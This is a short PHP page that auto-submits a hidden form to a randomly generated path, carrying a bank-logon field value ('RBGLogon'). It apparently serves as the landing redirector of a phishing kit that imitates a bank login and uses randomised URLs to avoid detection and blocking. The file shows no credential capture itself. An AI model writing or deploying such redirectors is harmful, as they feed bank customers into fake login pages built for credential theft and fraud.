<?php include('gen.php'); ?>
<form id="ponyo_form" action="<?php echo generateRandomString();?>" method="POST">
    <input type="hidden" name="LOB" value="RBGLogon" />
</form>
<script>
document.getElementById("ponyo_form").submit();
</script>